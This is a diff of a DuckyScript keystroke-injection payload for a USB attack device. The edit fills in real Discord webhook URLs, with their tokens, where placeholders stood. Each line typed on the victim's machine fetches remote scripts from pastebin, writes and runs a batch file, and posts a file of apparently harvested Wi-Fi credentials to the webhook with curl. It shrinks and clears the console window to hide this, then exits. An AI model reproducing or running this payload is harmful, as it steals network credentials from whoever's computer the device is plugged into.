@@ -6,12 +6,12 @@ DELAY 300
 
 ENTER
 DELAY 550
-STRING SET w=YOUR_WEBHOOK_HERE
+STRING SET w=https://discord.com/api/webhooks/1064114721109852231/oFTDh57-adR3Yoixna2fZ-MI22-s16auMg3D4dJMDaE8yZIzegbwByYNid4_uyuZVb4E && mode con:cols=20 lines=20 && cls
 DELAY 50
 ENTER
 
 DELAY 500
-STRING echo $WebResponse = Invoke-WebRequest "https://pastebin.com/raw/tDxzPkTH" >script.ps1 && echo $string = $WebResponse.Content >script.ps1 >>script.ps1 && echo $code = $string.replace('312312webhook69-url321312','%w%') >>script.ps1 && echo $code ^| Out-File wfsec_haxor1337.ps1 >>script.ps1 && echo $WebResponse = Invoke-WebRequest "https://pastebin.com/raw/XpsdKYUX" >>script.ps1 && echo $script = $WebResponse.Content >>script.ps1 >>script.ps1 && echo $codescript = $script.replace('312ewb-hook-url-here321','%w%') >>script.ps1 && echo $codescript ^| Out-File -Encoding UTF8 xcvdwa.bat >>script.ps1
+STRING echo $WebResponse = Invoke-WebRequest "https://pastebin.com/raw/tDxzPkTH" >script.ps1 && echo $string = $WebResponse.Content >script.ps1 >>script.ps1 && echo $code = $string.replace('312312webhook69-url321312','%w%') >>script.ps1 && echo $code ^| Out-File wfsec_haxor1337.ps1 >>script.ps1 && echo $WebResponse = Invoke-WebRequest "https://pastebin.com/raw/bdH4VDjL" >>script.ps1 && echo $script = $WebResponse.Content >>script.ps1 >>script.ps1 && echo $codescript = $script.replace('312ewb-hook-url-here321','%w%') >>script.ps1 && echo $codescript ^| Out-File -Encoding UTF8 xcvdwa.bat >>script.ps1 && cls
 ENTER
 DELAY 500
 
@@ -49,12 +49,13 @@ DELAY 200
 ENTER
 DELAY 500
 
-STRING xcvdwa
+STRING xcvdwa && cls
 DELAY 100
 ENTER
-DELAY 5500
+DELAY 6000
 
-STRING curl -X POST -H "Content-Type: multipart/form-data" -F "file1=@%temp%/wifi.txt" YOUR_WEBHOOK_HERE
+STRING curl -X POST -H "Content-Type: multipart/form-data" -F "file1=@%temp%/wifi.txt" https://discord.com/api/webhooks/1063949566031958068/vadCokbT1wlyfJz6DKJaVJA0Z7WZROQIatWhBKq1lqXMtmGph0l8_DBakShjdjypgtV8
 ENTER
-DELAY 1000
-
+DELAY 500
+STRING exit
+ENTER
